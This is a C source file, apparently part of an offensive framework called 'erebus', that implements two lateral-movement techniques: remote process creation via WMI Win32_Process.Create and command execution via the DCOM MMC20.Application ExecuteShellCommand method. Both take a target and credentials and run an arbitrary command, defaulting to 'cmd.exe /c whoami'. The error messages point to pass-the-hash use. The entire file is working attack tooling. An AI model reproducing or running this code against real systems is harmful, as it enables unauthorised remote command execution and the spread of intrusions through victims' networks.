/*
 * WMI (COM IWbemServices) process create + DCOM MMC20 ExecuteShellCommand.
 * Pure C COM (no C++ helpers).
 */
#define WIN32_LEAN_AND_MEAN
#define COBJMACROS
#include <windows.h>
#include <wbemidl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/lateral_impl.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")

/* Mingw may not link GUID_NULL from uuid without -luuid */
#ifndef EREBUS_GUID_NULL_DEFINED
#define EREBUS_GUID_NULL_DEFINED
const GUID GUID_NULL = {0, 0, 0, {0, 0, 0, 0, 0, 0, 0, 0}};
#endif

static BSTR bstr_utf8(const char *s) {
    if (!s) s = "";
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (n <= 0) return NULL;
    wchar_t *w = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
    if (!w) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    BSTR b = SysAllocString(w);
    free(w);
    return b;
}

static void set_proxy(IUnknown *p, const char *user, const char *password, const char *domain) {
    SEC_WINNT_AUTH_IDENTITY_W id;
    memset(&id, 0, sizeof(id));
    wchar_t *wuser = NULL, *wpass = NULL, *wdom = NULL;
    if (user && user[0]) {
        int n = MultiByteToWideChar(CP_UTF8, 0, user, -1, NULL, 0);
        wuser = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
        if (wuser) MultiByteToWideChar(CP_UTF8, 0, user, -1, wuser, n);
        id.User = (unsigned short *)wuser;
        id.UserLength = wuser ? (unsigned long)wcslen(wuser) : 0;
    }
    if (password && password[0]) {
        int n = MultiByteToWideChar(CP_UTF8, 0, password, -1, NULL, 0);
        wpass = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
        if (wpass) MultiByteToWideChar(CP_UTF8, 0, password, -1, wpass, n);
        id.Password = (unsigned short *)wpass;
        id.PasswordLength = wpass ? (unsigned long)wcslen(wpass) : 0;
    }
    if (domain && domain[0]) {
        int n = MultiByteToWideChar(CP_UTF8, 0, domain, -1, NULL, 0);
        wdom = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
        if (wdom) MultiByteToWideChar(CP_UTF8, 0, domain, -1, wdom, n);
        id.Domain = (unsigned short *)wdom;
        id.DomainLength = wdom ? (unsigned long)wcslen(wdom) : 0;
    }
    id.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
    CoSetProxyBlanket(p, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
        (user && user[0]) ? &id : NULL, EOAC_NONE);
    free(wuser); free(wpass); free(wdom);
}

int erebus_lateral_wmi(const erebus_lateral_config *cfg, char *output, size_t output_cap, int *success) {
    *success = 0;
    output[0] = '\0';

    if (cfg->ntlm_hash[0] && !cfg->password[0]) {
        snprintf(output, output_cap, "wmi COM path needs password; use winrm with ntlm_hash for PTH");
        return 1;
    }

    const char *command = cfg->command[0] ? cfg->command : "cmd.exe /c whoami";

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    int need_uninit = SUCCEEDED(hr);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        snprintf(output, output_cap, "CoInitializeEx failed: 0x%08lx", (unsigned long)hr);
        return 1;
    }
    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);

    IWbemLocator *loc = NULL;
    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        &IID_IWbemLocator, (void **)&loc);
    if (FAILED(hr) || !loc) {
        snprintf(output, output_cap, "WbemLocator create failed: 0x%08lx", (unsigned long)hr);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    wchar_t wpath[512];
    _snwprintf(wpath, 512, L"\\\\%hs\\root\\cimv2", cfg->target);
    BSTR bpath = SysAllocString(wpath);
    BSTR buser = NULL, bpass = NULL;
    if (cfg->username[0]) {
        char userbuf[512];
        if (cfg->domain[0])
            snprintf(userbuf, sizeof(userbuf), "%s\\%s", cfg->domain, cfg->username);
        else
            snprintf(userbuf, sizeof(userbuf), "%s", cfg->username);
        buser = bstr_utf8(userbuf);
        bpass = bstr_utf8(cfg->password);
    }

    IWbemServices *svc = NULL;
    hr = IWbemLocator_ConnectServer(loc, bpath, buser, bpass, NULL, 0, NULL, NULL, &svc);
    SysFreeString(bpath);
    if (buser) SysFreeString(buser);
    if (bpass) SysFreeString(bpass);
    if (FAILED(hr) || !svc) {
        snprintf(output, output_cap, "WMI ConnectServer failed: 0x%08lx", (unsigned long)hr);
        IWbemLocator_Release(loc);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    set_proxy((IUnknown *)svc, cfg->username[0] ? cfg->username : NULL,
        cfg->password, cfg->domain[0] ? cfg->domain : NULL);

    BSTR bclass = SysAllocString(L"Win32_Process");
    IWbemClassObject *proc_class = NULL;
    hr = IWbemServices_GetObject(svc, bclass, 0, NULL, &proc_class, NULL);
    if (FAILED(hr) || !proc_class) {
        snprintf(output, output_cap, "GetObject Win32_Process failed: 0x%08lx", (unsigned long)hr);
        SysFreeString(bclass);
        IWbemServices_Release(svc);
        IWbemLocator_Release(loc);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    BSTR bmethod = SysAllocString(L"Create");
    IWbemClassObject *in_sig = NULL;
    hr = IWbemClassObject_GetMethod(proc_class, bmethod, 0, &in_sig, NULL);
    IWbemClassObject_Release(proc_class);
    if (FAILED(hr) || !in_sig) {
        snprintf(output, output_cap, "GetMethod Create failed: 0x%08lx", (unsigned long)hr);
        SysFreeString(bclass);
        SysFreeString(bmethod);
        IWbemServices_Release(svc);
        IWbemLocator_Release(loc);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    IWbemClassObject *in_params = NULL;
    hr = IWbemClassObject_SpawnInstance(in_sig, 0, &in_params);
    IWbemClassObject_Release(in_sig);
    if (FAILED(hr) || !in_params) {
        snprintf(output, output_cap, "SpawnInstance failed: 0x%08lx", (unsigned long)hr);
        SysFreeString(bclass);
        SysFreeString(bmethod);
        IWbemServices_Release(svc);
        IWbemLocator_Release(loc);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    VARIANT vcmd;
    VariantInit(&vcmd);
    vcmd.vt = VT_BSTR;
    vcmd.bstrVal = bstr_utf8(command);
    BSTR bcmdname = SysAllocString(L"CommandLine");
    IWbemClassObject_Put(in_params, bcmdname, 0, &vcmd, 0);
    SysFreeString(bcmdname);
    VariantClear(&vcmd);

    IWbemClassObject *out_params = NULL;
    hr = IWbemServices_ExecMethod(svc, bclass, bmethod, 0, NULL, in_params, &out_params, NULL);
    IWbemClassObject_Release(in_params);
    SysFreeString(bclass);
    SysFreeString(bmethod);

    if (FAILED(hr)) {
        snprintf(output, output_cap, "ExecMethod Create failed: 0x%08lx", (unsigned long)hr);
        if (out_params) IWbemClassObject_Release(out_params);
        IWbemServices_Release(svc);
        IWbemLocator_Release(loc);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    if (out_params) {
        VARIANT vret, vpid;
        VariantInit(&vret);
        VariantInit(&vpid);
        BSTR br = SysAllocString(L"ReturnValue");
        BSTR bp = SysAllocString(L"ProcessId");
        IWbemClassObject_Get(out_params, br, 0, &vret, 0, 0);
        IWbemClassObject_Get(out_params, bp, 0, &vpid, 0, 0);
        SysFreeString(br);
        SysFreeString(bp);
        unsigned long rv = (vret.vt == VT_I4) ? (unsigned long)vret.lVal : 0xFFFFFFFF;
        unsigned long pid = (vpid.vt == VT_I4) ? (unsigned long)vpid.lVal : 0;
        VariantClear(&vret);
        VariantClear(&vpid);
        IWbemClassObject_Release(out_params);
        if (rv == 0) {
            snprintf(output, output_cap, "WMI process created pid=%lu cmd=%s", pid, command);
            *success = 1;
        } else {
            snprintf(output, output_cap, "WMI Create ReturnValue=%lu", rv);
        }
    } else {
        snprintf(output, output_cap, "WMI Create returned no out params");
    }

    IWbemServices_Release(svc);
    IWbemLocator_Release(loc);
    if (need_uninit) CoUninitialize();
    return 1;
}

/* MMC Application {49B2791A-B1AE-4C90-9B8E-E860BA07F889} */
static const CLSID CLSID_MMCApp = {
    0x49B2791A, 0xB1AE, 0x4C90, {0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89}
};

int erebus_lateral_dcom(const erebus_lateral_config *cfg, char *output, size_t output_cap, int *success) {
    *success = 0;
    output[0] = '\0';

    if (cfg->ntlm_hash[0] && !cfg->password[0]) {
        snprintf(output, output_cap, "dcom needs password for CoCreateInstanceEx; use winrm ntlm_hash for PTH");
        return 1;
    }

    const char *command = cfg->command[0] ? cfg->command : "cmd.exe /c whoami";

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    int need_uninit = SUCCEEDED(hr);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        snprintf(output, output_cap, "CoInitializeEx failed: 0x%08lx", (unsigned long)hr);
        return 1;
    }
    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);

    COSERVERINFO server;
    memset(&server, 0, sizeof(server));
    wchar_t wtarget[256];
    MultiByteToWideChar(CP_UTF8, 0, cfg->target, -1, wtarget, 256);
    server.pwszName = wtarget;

    COAUTHIDENTITY authid;
    COAUTHINFO authinfo;
    memset(&authid, 0, sizeof(authid));
    memset(&authinfo, 0, sizeof(authinfo));
    wchar_t *wuser = NULL, *wpass = NULL, *wdom = NULL;
    if (cfg->username[0]) {
        int n = MultiByteToWideChar(CP_UTF8, 0, cfg->username, -1, NULL, 0);
        wuser = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
        MultiByteToWideChar(CP_UTF8, 0, cfg->username, -1, wuser, n);
        n = MultiByteToWideChar(CP_UTF8, 0, cfg->password, -1, NULL, 0);
        wpass = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
        MultiByteToWideChar(CP_UTF8, 0, cfg->password, -1, wpass, n);
        if (cfg->domain[0]) {
            n = MultiByteToWideChar(CP_UTF8, 0, cfg->domain, -1, NULL, 0);
            wdom = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
            MultiByteToWideChar(CP_UTF8, 0, cfg->domain, -1, wdom, n);
        }
        authid.User = (USHORT *)wuser;
        authid.UserLength = (ULONG)wcslen(wuser);
        authid.Password = (USHORT *)wpass;
        authid.PasswordLength = (ULONG)wcslen(wpass);
        authid.Domain = (USHORT *)wdom;
        authid.DomainLength = wdom ? (ULONG)wcslen(wdom) : 0;
        authid.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
        authinfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
        authinfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
        authinfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
        authinfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
        authinfo.pAuthIdentityData = &authid;
        authinfo.dwCapabilities = EOAC_NONE;
        server.pAuthInfo = &authinfo;
    }

    MULTI_QI mqi;
    memset(&mqi, 0, sizeof(mqi));
    mqi.pIID = &IID_IDispatch;
    hr = CoCreateInstanceEx(&CLSID_MMCApp, NULL, CLSCTX_REMOTE_SERVER, &server, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr) || !mqi.pItf) {
        snprintf(output, output_cap, "DCOM CoCreateInstanceEx MMC20 failed: 0x%08lx (hr2=0x%08lx)",
            (unsigned long)hr, (unsigned long)mqi.hr);
        free(wuser); free(wpass); free(wdom);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    IDispatch *disp = (IDispatch *)mqi.pItf;
    set_proxy((IUnknown *)disp, cfg->username[0] ? cfg->username : NULL,
        cfg->password, cfg->domain[0] ? cfg->domain : NULL);

    OLECHAR *doc_name = L"Document";
    DISPID doc_id = 0;
    hr = IDispatch_GetIDsOfNames(disp, &IID_NULL, &doc_name, 1, LOCALE_USER_DEFAULT, &doc_id);
    if (FAILED(hr)) {
        snprintf(output, output_cap, "DCOM Document name failed: 0x%08lx", (unsigned long)hr);
        IDispatch_Release(disp);
        free(wuser); free(wpass); free(wdom);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    DISPPARAMS empty = { NULL, NULL, 0, 0 };
    VARIANT vdoc;
    VariantInit(&vdoc);
    hr = IDispatch_Invoke(disp, doc_id, &IID_NULL, LOCALE_USER_DEFAULT,
        DISPATCH_PROPERTYGET, &empty, &vdoc, NULL, NULL);
    if (FAILED(hr) || vdoc.vt != VT_DISPATCH || !vdoc.pdispVal) {
        snprintf(output, output_cap, "DCOM Document get failed: 0x%08lx", (unsigned long)hr);
        VariantClear(&vdoc);
        IDispatch_Release(disp);
        free(wuser); free(wpass); free(wdom);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    IDispatch *doc = vdoc.pdispVal;
    OLECHAR *av_name = L"ActiveView";
    DISPID av_id = 0;
    VARIANT vav;
    VariantInit(&vav);
    hr = IDispatch_GetIDsOfNames(doc, &IID_NULL, &av_name, 1, LOCALE_USER_DEFAULT, &av_id);
    if (SUCCEEDED(hr)) {
        hr = IDispatch_Invoke(doc, av_id, &IID_NULL, LOCALE_USER_DEFAULT,
            DISPATCH_PROPERTYGET, &empty, &vav, NULL, NULL);
    }
    if (FAILED(hr) || vav.vt != VT_DISPATCH || !vav.pdispVal) {
        snprintf(output, output_cap, "DCOM ActiveView get failed: 0x%08lx", (unsigned long)hr);
        VariantClear(&vav);
        VariantClear(&vdoc);
        IDispatch_Release(disp);
        free(wuser); free(wpass); free(wdom);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    IDispatch *view = vav.pdispVal;
    OLECHAR *ex_name = L"ExecuteShellCommand";
    DISPID ex_id = 0;
    hr = IDispatch_GetIDsOfNames(view, &IID_NULL, &ex_name, 1, LOCALE_USER_DEFAULT, &ex_id);
    if (FAILED(hr)) {
        snprintf(output, output_cap, "DCOM ExecuteShellCommand name failed: 0x%08lx", (unsigned long)hr);
        VariantClear(&vav);
        VariantClear(&vdoc);
        IDispatch_Release(disp);
        free(wuser); free(wpass); free(wdom);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    /* DISPPARAMS args are reverse order */
    VARIANT args[4];
    VariantInit(&args[0]);
    VariantInit(&args[1]);
    VariantInit(&args[2]);
    VariantInit(&args[3]);
    args[3].vt = VT_BSTR; args[3].bstrVal = bstr_utf8(command);
    args[2].vt = VT_BSTR; args[2].bstrVal = SysAllocString(L"");
    args[1].vt = VT_BSTR; args[1].bstrVal = SysAllocString(L"");
    args[0].vt = VT_BSTR; args[0].bstrVal = SysAllocString(L"7");

    DISPPARAMS dp;
    memset(&dp, 0, sizeof(dp));
    dp.cArgs = 4;
    dp.rgvarg = args;

    VARIANT vresult;
    VariantInit(&vresult);
    hr = IDispatch_Invoke(view, ex_id, &IID_NULL, LOCALE_USER_DEFAULT,
        DISPATCH_METHOD, &dp, &vresult, NULL, NULL);

    VariantClear(&args[0]);
    VariantClear(&args[1]);
    VariantClear(&args[2]);
    VariantClear(&args[3]);
    VariantClear(&vresult);
    VariantClear(&vav);
    VariantClear(&vdoc);
    IDispatch_Release(disp);
    free(wuser); free(wpass); free(wdom);

    if (FAILED(hr)) {
        snprintf(output, output_cap, "DCOM ExecuteShellCommand failed: 0x%08lx", (unsigned long)hr);
        if (need_uninit) CoUninitialize();
        return 1;
    }

    snprintf(output, output_cap, "DCOM MMC ExecuteShellCommand issued on %s: %s", cfg->target, command);
    *success = 1;
    if (need_uninit) CoUninitialize();
    return 1;
}
